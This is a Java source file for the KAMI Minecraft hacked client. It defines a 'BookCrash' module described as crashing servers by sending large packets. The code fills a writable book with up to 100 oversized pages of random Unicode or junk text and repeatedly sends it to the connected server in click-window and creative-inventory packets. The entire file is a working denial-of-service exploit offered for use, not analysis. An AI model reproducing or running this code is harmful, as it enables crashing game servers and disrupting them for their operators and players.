package me.zeroeightsix.kami.module.modules.misc;

import me.zeroeightsix.kami.module.Module;
import me.zeroeightsix.kami.setting.Setting;
import me.zeroeightsix.kami.setting.Settings;
import net.minecraft.client.Minecraft;
import net.minecraft.init.Items;
import net.minecraft.inventory.ClickType;
import net.minecraft.item.ItemStack;
import net.minecraft.nbt.NBTTagCompound;
import net.minecraft.nbt.NBTTagList;
import net.minecraft.nbt.NBTTagString;
import net.minecraft.network.play.client.CPacketClickWindow;
import net.minecraft.network.play.client.CPacketCreativeInventoryAction;

import java.util.Random;
import java.util.stream.Collectors;
import java.util.stream.IntStream;

import static me.zeroeightsix.kami.util.MessageSendHelper.sendChatMessage;

/**
 * Created by d1gress/Qther on 25/11/2019.
 * Updated by d1gress/Qther on 26/11/2019.
 */
@Module.Info(
        name = "BookCrash",
        category = Module.Category.MISC,
        description = "Crashes servers by sending large packets"
)
public class BookCrash extends Module {

    private int currDelay;
    private Setting<Mode> mode = register(Settings.e("Mode", Mode.RAION));
    private Setting<FillMode> fillMode = register(Settings.e("FillMode", FillMode.RANDOM));
    private Setting<Integer> uses = register(Settings.i("Uses", 5));
    private Setting<Integer> delay = register(Settings.i("Delay", 0));
    private Setting<Integer> pagesSettings = register(Settings.i("Pages", 50));
    private Setting<Boolean> autoToggle = register(Settings.b("AutoToggle", true));

    @Override
    public void onUpdate() {
        if (Minecraft.getMinecraft().getCurrentServerData() == null || Minecraft.getMinecraft().getCurrentServerData().serverIP.isEmpty()) {
            sendChatMessage("Not connected to a server");
            disable();
        }

        currDelay = (currDelay >= delay.getValue() ? 0 : delay.getValue() + 1);
        if (currDelay > 0) return;

        ItemStack bookObj = new ItemStack(Items.WRITABLE_BOOK);
        NBTTagList list = new NBTTagList();
        NBTTagCompound tag = new NBTTagCompound();
        String author = "Bella";
        String title = "\n Bella Nuzzles You \n";

        String size = "";
        int pages = Math.min(pagesSettings.getValue(), 100);
        int pageChars = 210;

        if (fillMode.getValue().equals(FillMode.RANDOM)) {
            IntStream chars = new Random().ints(0x80, 0x10FFFF - 0x800).map(i -> i < 0xd800 ? i : i + 0x800);
            size = chars.limit(pageChars * pages).mapToObj(i -> String.valueOf((char) i)).collect(Collectors.joining());
        } else if (fillMode.getValue().equals(FillMode.FFFF)) {
            size = repeat(pages * pageChars, String.valueOf(0x10FFFF));
        } else if (fillMode.getValue().equals(FillMode.ASCII)) {
            IntStream chars = new Random().ints(0x20, 0x7E);
            size = chars.limit(pageChars * pages).mapToObj(i -> String.valueOf((char) i)).collect(Collectors.joining());
        } else if (fillMode.getValue().equals(FillMode.OLD)) {
            size = "wveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5vr2c43rc434v432tvt4tvybn4n6n57u6u57m6m6678mi68,867,79o,o97o,978iun7yb65453v4tyv34t4t3c2cc423rc334tcvtvt43tv45tvt5t5v43tv5345tv43tv5355vt5t3tv5t533v5t45tv43vt4355t54fwveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5vr2c43rc434v432tvt4tvybn4n6n57u6u57m6m6678mi68,867,79o,o97o,978iun7yb65453v4tyv34t4t3c2cc423rc334tcvtvt43tv45tvt5t5v43tv5345tv43tv5355vt5t3tv5t533v5t45tv43vt4355t54fwveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5";
        }

        for (int i = 0; i < pages; i++) {
            String siteContent = size;
            NBTTagString tString = new NBTTagString(siteContent);
            list.appendTag(tString);
        }

        tag.setString("author", author);
        tag.setString("title", title);
        tag.setTag("pages", list);

        bookObj.setTagInfo("pages", list);
        bookObj.setTagCompound(tag);

        for (int i = 0; i < uses.getValue(); i++) {
            mc.playerController.connection.sendPacket(new CPacketClickWindow(0, 0, 0, ClickType.PICKUP, bookObj, (short) 0));
            if (mode.getValue() == Mode.JESSICA) {
                mc.playerController.connection.sendPacket(new CPacketCreativeInventoryAction(0, bookObj));
            }
        }
    }

    private enum Mode {
        JESSICA, RAION
    }

    private enum FillMode {
        ASCII, FFFF, RANDOM, OLD
    }

    private static String repeat(int count, String with) {
        return new String(new char[count]).replace("\0", with);
    }

}
